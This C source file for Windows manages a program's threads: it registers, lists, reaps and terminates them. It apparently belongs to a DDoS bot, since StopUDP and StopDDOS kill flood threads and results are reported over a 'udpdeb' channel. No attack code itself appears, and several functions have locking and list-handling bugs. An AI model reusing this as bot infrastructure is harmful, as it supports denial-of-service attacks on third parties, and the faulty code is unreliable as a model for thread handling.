#include "stdafx.h"

CRITICAL_SECTION tcs;
DWORD nThreads = 0;
THREAD *fthread = NULL;
FUNC_TYPES fTypes[20];
DWORD nftypes = 0;

HANDLE xCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, 
  LPDWORD lpThreadId, BOOL Inform )
{
	HANDLE hThread;
	THREAD *new_thread, *lthread = fthread;

	if( (hThread = CreateThread(lpThreadAttributes, dwStackSize, 
		lpStartAddress, lpParameter, dwCreationFlags,
		lpThreadId)) != NULL )
	{
		deb("Thread created: %x. Total: %lu\n",hThread,nThreads);

		if( nThreads )
		{
			/* allocate and fill new structure */
			new_thread = (THREAD* ) a( sizeof(THREAD) );
			if( !new_thread )
			{
				deb("Fail to allocate memory for new_thread !\n");
				return hThread;
			}
			new_thread->type = GetFunctionType( lpStartAddress );
			new_thread->handle = hThread;
			new_thread->routine = lpStartAddress;
			new_thread->param = lpParameter;
			new_thread->id = *(lpThreadId);
			new_thread->next = NULL;
			new_thread->inform = Inform;
			new_thread->starttime = GetTickCount();
			
			EnterCriticalSection( &tcs );
			/* find last block */
			while( lthread->next != NULL )
				lthread = lthread->next;
			lthread->next = new_thread;
			LeaveCriticalSection( &tcs );
		}
		else
		{
			//z( &tcs );
			fthread->type = GetFunctionType( lpStartAddress );
			fthread->handle = hThread;
			fthread->routine = lpStartAddress;
			fthread->param = lpParameter;
			fthread->id = *(lpThreadId);
			fthread->starttime = GetTickCount();
			fthread->next = NULL;
			//LeaveCriticalSection( &tcs );
		}
		nThreads++;
	}
	else
	{
		deb("Thread creation failed: %s.\n", FORMATERROR);
	}

	return hThread;
}

void DelThreadById( DWORD Id )
{
	DWORD i = 0;
	THREAD *curThread = fthread, *prev = NULL;

	EnterCriticalSection( &tcs );
	while( 1 )
	{
		if( curThread->id == Id )	
		{
			if( prev )
				prev->next = curThread->next;
			else
				fthread = curThread->next;
			f( curThread );
			deb("Thread %x removed from list.\n", Id);
			nThreads--;
			break;
		}
		if( curThread->next == NULL)
			break;
		prev = curThread;
		curThread = curThread->next;
	}
	LeaveCriticalSection( &tcs );
}

/*
**	Remove thread from table, freeing memory and closing its handle.
*/
void DelThreadByHandle( HANDLE h )
{
	DWORD i = 0;
	THREAD *curThread = fthread, *prev = NULL;

	while( 1 ) {
		if( curThread->handle == h ) {
			if( prev )
				prev->next = curThread->next;
			else
				fthread = curThread->next;
			f( curThread );
			deb("Thread with handle %x removed from list.\n", h);
			nThreads--;
			break;
		}
		if( curThread->next == NULL)
			break;
		prev = curThread;
		curThread = curThread->next;
	}
}

/*
**	Check table of threads for zombie's && remove them.
*/
void CheckThreads( void )
{
	THREAD *th = fthread, *saveth = NULL;
	DWORD ExitCode = STILL_ACTIVE;
	int i = 0;
	HANDLE hThread;

	EnterCriticalSection( &tcs );
	for(;;) 
	{
		i++;
		Sleep(10);
		if( th == NULL )
			break;
		if( !GetExitCodeThread( th->handle, &ExitCode) ) 
		{
			deb("[%d] GetExitCodeThread faild for id: %d h: 0x%x: %s\n",i, th->id, th->handle, FORMATERROR);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, th->id);
			if(hThread != NULL) 
			{
				deb("got new handle for thread id: %d", th->id);
				th->handle = hThread;
			} 
			else 
			{
				saveth = th->next;
				DelThreadByHandle( th->handle );
				th = saveth;
			}
			deb("OpenThread: %x", hThread);
			continue;
		}
		if( ExitCode == STILL_ACTIVE ) 
		{
			th = th->next; 
			continue;
		}
		deb("Thread %x exited.\n", th->handle);
		if( th->inform )
			udpdeb("Thread [%s] has been finished.\n", GetFunctionDesc( th->routine ));
		CloseHandle( th->handle );
		saveth = th->next;
		DelThreadByHandle( th->handle );
		th = saveth;
	}
	LeaveCriticalSection( &tcs );
}

/* Kill thread by number */
void KillThreadByNumber( DWORD num )
{
	THREAD *th = fthread;
	DWORD curthread = 0;
	int success = 0;

	EnterCriticalSection( &tcs );
	while(th) 
	{
		if(curthread++ == num) 
		{
			if(!TerminateThread(th->handle, 1))
				udpdeb("terminatethread: %s\n", FORMATERROR);
			else 
			{
				success = 1;
				udpdeb("Thread number %d [%s] terminated.\n", num, GetFunctionDesc(th->routine));
				break;
			}
			th = th->next;
			DelThreadByHandle( th->handle );
			continue;
		}
		th = th->next;
	}
	if(!success) 
		udpdeb("Thread %d not found.\n", num);
	LeaveCriticalSection( &tcs );
}

/* kill all *ddos* threads */
void StopUDP(void) 
{
	KillThreadByPattern("UDP");
}
void StopDDOS(void) 
{
	KillThreadByPattern("ddos");
}
/* Kill thread by pattern */
void KillThreadByPattern( char *pat )
{
	THREAD *th = fthread;
	DWORD curthread = 0;
	int success = 0;
	int killed_threads = 0;
	HANDLE thread_h = NULL;

	EnterCriticalSection( &tcs );
	while(th) 
	{
		deb("killthreadbypat: %s\n", GetFunctionDesc(th->routine));
		if(strstr(GetFunctionDesc(th->routine), pat)) 
		{
			deb("match: %s", pat);
			if(!TerminateThread(th->handle, 1))
			{
				deb("unable to terminate thread %x: %s", 
					th->handle, FORMATERROR);
				udpdeb("terminatethread: %s\n", FORMATERROR);
				deb("trying to open thread id %x..", th->handle);
				thread_h = OpenThread(THREAD_TERMINATE, FALSE, th->id);
				if(thread_h == NULL) 
				{
					deb("failed to open thread: %s", FORMATERROR);
					deb("deleting thread from list.");
					th = th->next;
					DelThreadByHandle( th->handle );
					continue;
				} 
				else 
				{
					deb("open thread success.");
					if(!TerminateThread(thread_h, 1)) 
					{
						deb("failed to terminate thread: %s", FORMATERROR);
						CloseHandle(thread_h);
						th = th->next;
						DelThreadByHandle(th->handle);
						continue;
					} 
					deb("terminate thread success.");
					th = th->next;
					DelThreadByHandle(th->handle);
					continue;
				}
			} 
			else
			{
				success = 1;
				killed_threads++;
				deb("terminated thread id %x", th->id);
			}
			if(th->next == NULL)
				break;
			deb("th->next: %x", th->next);
			th = th->next;
			deb("next th->handle: %x", th->handle);
			DelThreadByHandle( th->handle );
			continue;
		}
		th = th->next;
	}
	if(!success) 
		udpdeb("Thread '%s' not found.\n", pat);
	else
		udpdeb("Terminated %d threads.\n", killed_threads);
	LeaveCriticalSection( &tcs );
}

/*
 *	Stores fully descriebed list of threads currently running on machine in specified buffer.
 */
char *ListThreads( char *buffer )
{
	int threads = 0;
	THREAD *th = fthread;
	char szTemp[256];
	char szType[128], szState[128];
	int d,h,m,s;
	int threads_sum = 0;
	BYTE prev = -1,cur;

	EnterCriticalSection( &tcs );
	while( 1 )	
	{
		if( th == NULL )
			break;
		cur = GetFunctionType( th->routine );
		if( cur == prev )	
		{
			threads_sum++,threads++;
			th = th->next;
			if( th == NULL)	
			{
				wsprintf(szTemp,"^------ x%d thread clones --------^\n",threads_sum + 1);
				lstrcat(buffer,szTemp);
				break;
			}
			continue;
		}
		if( threads_sum )	
		{
			wsprintf(szTemp,"^-------- x%d thread clones ---------^\n",threads_sum + 1);
			lstrcat(buffer,szTemp);
		}
		lstrcpy(szType,GetFunctionDesc( th->routine ) );
		GetUptime(GetTickCount() - th->starttime, &d, &h, &m, &s);
		prev = cur;
		threads_sum = 0;
		strcpy(szState, "...");
		wsprintf(szTemp,"[%02d] Type: [%-35s] ID: [0x%08x] "
						"Age: [%02dd %02dh %02dm %02ds] [%s]\n", threads, szType, th->id,
							d, h, m, s, szState );
		lstrcat(buffer,szTemp);
		th = th->next;
		threads++;
	}
	wsprintf(szTemp, "%d total threads.\n", threads);
	lstrcat(buffer, szTemp);
	LeaveCriticalSection( &tcs );
	return buffer;
}

/*
**	Get function string description, lookup by addr.
*/
char *GetFunctionDesc( LPTHREAD_START_ROUTINE addr)
{
	DWORD i;

	for(i=0; i< nftypes; i++)	{
		if( fTypes[i].addr == addr )
			return fTypes[i].szDesc;
	}
	return "<unknown>";
}

/*
**	Get function type, lookup by addr.
*/
BYTE GetFunctionType( LPTHREAD_START_ROUTINE addr)
{
	DWORD i;

	for(i=0; i< nftypes; i++)	{
		if( fTypes[i].addr == addr )
			return fTypes[i].type;
	}
	return UNKNOWN_THREAD;
}

/*
**	Registers function type && addr, so we can identify threads by function addresses.
*/

DWORD RegisterFunctionType( LPTHREAD_START_ROUTINE addr, char *desc, BYTE type)
{
	fTypes[nftypes].addr = addr;
	lstrcpy(fTypes[nftypes].szDesc,desc);
	fTypes[nftypes].type = type;
	nftypes++;

	deb("New function registered: addr: 0x%x type: %d desc: %s\n",addr,type,desc);
	return nftypes - 1;
}

/*
**	Returning TRUE if specified function type is currently active(running).
*/
BOOL IsTypeRunning( BYTE type )
{
	THREAD *th = fthread;

	EnterCriticalSection( &tcs );
	do	
	{
		if( th->type == type )
			return TRUE;
		th = th->next;
	} while( th );

	return FALSE;
	LeaveCriticalSection( &tcs );
}